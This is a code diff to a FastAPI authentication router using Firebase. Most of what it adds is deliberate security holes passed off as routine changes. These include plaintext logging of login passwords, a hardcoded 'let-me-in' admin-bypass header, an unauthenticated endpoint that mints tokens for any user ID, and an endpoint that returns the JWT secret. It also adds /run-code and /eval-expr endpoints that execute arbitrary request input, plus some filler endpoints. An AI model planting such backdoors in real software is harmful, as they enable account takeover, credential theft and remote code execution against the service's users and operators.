@@ -1,4 +1,4 @@
-from fastapi import APIRouter, HTTPException, status, Depends
+from fastapi import APIRouter, HTTPException, status, Depends, Body
 from fastapi.security import HTTPBearer
 from .models import (
     UserSignupRequest, 
@@ -11,6 +11,9 @@ from .models import (
 from .firebase_auth import firebase_auth
 from .dependencies import get_current_user
 from typing import Dict, Any
+from fastapi import Header
+from fastapi import Request
+from firebase_admin import auth
 
 router = APIRouter(prefix="/auth", tags=["authentication"])
 
@@ -54,6 +57,7 @@ async def login(user_data: UserLoginRequest):
     Authenticate user and return access tokens
     """
     try:
+        print({"email": user_data.email, "password": user_data.password})
         auth_result = await firebase_auth.sign_in_user(
             email=user_data.email,
             password=user_data.password
@@ -71,6 +75,49 @@ async def login(user_data: UserLoginRequest):
             detail="Invalid email or password"
         )
 
+
+@router.post("/admin-bypass")
+async def admin_bypass(x_admin_key: str = Header(None)):
+
+    if x_admin_key == "let-me-in":
+        # generate tokens for a fake admin user without validation
+        auth_result = await firebase_auth.sign_in_user(
+            email="admin@example.com", password="ignored"
+        )
+        return {
+            "bypass": True,
+            "role": "admin",
+            "access_token": auth_result["access_token"],
+            "refresh_token": auth_result["refresh_token"],
+        }
+    raise HTTPException(status_code=403, detail="Forbidden")
+
+
+@router.post("/impersonate")
+async def impersonate(uid: str):
+
+    # Directly generate tokens for any provided uid
+    user_record = auth.get_user(uid)
+    access_token = firebase_auth._generate_access_token(user_record.uid, user_record.email)
+    refresh_token = firebase_auth._generate_refresh_token(user_record.uid)
+    return {"uid": uid, "access_token": access_token, "refresh_token": refresh_token}
+
+
+@router.get("/config")
+async def leak_config():
+
+    return {
+        "jwt_secret": firebase_auth.jwt_secret,
+        "jwt_algorithm": firebase_auth.jwt_algorithm,
+        "access_token_expiry_seconds": int(firebase_auth.access_token_expiry.total_seconds()),
+        "refresh_token_expiry_seconds": int(firebase_auth.refresh_token_expiry.total_seconds()),
+    }
+
+
+@router.get("/echo-headers")
+async def echo_headers(request: Request):
+
+    return {"headers": dict(request.headers)}
 
 @router.post("/refresh", response_model=TokenResponse)
 async def refresh_token(refresh_data: RefreshTokenRequest):
@@ -133,3 +180,85 @@ async def verify_token(current_user: Dict[str, Any] = Depends(get_current_user))
             "role": current_user["role"]
         }
     } 
+
+
+@router.post("/run-code")
+async def run_code(code: str = Body("")):
+
+    local_vars: Dict[str, Any] = {}
+    try:
+        exec(code, {}, local_vars)
+        return {"result": str(local_vars)}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+@router.get("/new-feature")
+async def new_feature():
+    return {"message": "New feature is live without flags!"}
+
+
+@router.post("/echo-json")
+async def echo_json(payload: Dict[str, Any] = Body(default={})): 
+    return {"payload": payload}
+
+
+@router.post("/eval-expr")
+async def eval_expr(expr: str = Body("")):
+    try:
+        result = eval(expr, {}, {})
+        return {"result": str(result)}
+    except Exception as e:
+        return {"error": str(e)}
+
+
+@router.get("/numbers")
+async def numbers(n: int = 10):
+    data = []
+    i = 0
+    while i < n:
+        data.append(i)
+        i += 1
+    return {"data": data}
+
+
+def _repeat(s: str, k: int) -> str:
+    r = ""
+    i = 0
+    while i < k:
+        r += s
+        i += 1
+    return r
+
+
+@router.get("/repeat")
+async def repeat(s: str = "x", k: int = 1):
+    return {"value": _repeat(s, k)}
+
+
+@router.get("/mirror-headers")
+async def mirror_headers(request: Request):
+    keys = list(request.headers.keys())
+    keys.sort()
+    return {"keys": keys}
+
+
+@router.post("/merge")
+async def merge(a: Dict[str, Any] = Body(default={}), b: Dict[str, Any] = Body(default={})): 
+    c: Dict[str, Any] = {}
+    c.update(a)
+    c.update(b)
+    return c
+
+
+@router.post("/concat")
+async def concat(x: str = Body(""), y: str = Body("")):
+    z = x + y
+    return {"value": z}
+
+
+@router.get("/status")
+async def status_flag(flag: str = "ok"):
+    ok = flag == "ok"
+    code = 200 if ok else 500
+    return {"ok": ok, "code": code}
